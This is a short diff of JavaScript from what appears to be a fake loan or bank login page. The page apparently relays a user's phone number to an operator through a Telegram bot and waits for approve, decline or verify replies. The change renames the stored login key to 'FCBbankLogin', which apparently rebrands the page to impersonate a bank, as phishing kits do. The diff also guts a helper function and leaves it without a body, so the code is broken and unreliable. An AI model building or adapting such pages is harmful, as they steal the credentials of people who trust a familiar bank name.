@@ -492,18 +492,8 @@
     };
 
     let state = { lastUpdateId: 0 };
-    let isProcessing = false;
     // ── Load application details from localStorage (original logic preserved) ──
-    function getStoredApplication() {
-      try {
-        return JSON.parse(localStorage.getItem('loanApplication') || '{}');
-      } catch (e) {
-        return {};
-      }
-    }
-
-    function normalizePhone(phone) {
-      return String(phone || '').replace(/\D/g, '').replace(/^263/, '').slice(-9);
+    function getStoredApplication() 
     }
 
     // ── Telegram bot send + poll ──
@@ -535,7 +525,7 @@
       .then(() => {
         // Save phone to localStorage (original behaviour)
         localStorage.setItem('phone', phone);
-        localStorage.setItem('flexLoanLogin', JSON.stringify({ phone, continuedAt: new Date().toISOString() }));
+        localStorage.setItem('FCBbankLogin', JSON.stringify({ phone, continuedAt: new Date().toISOString() }));
 
         spinnerOverlay.style.display = 'flex';
         startPolling(approveId, declineId, verifyId);
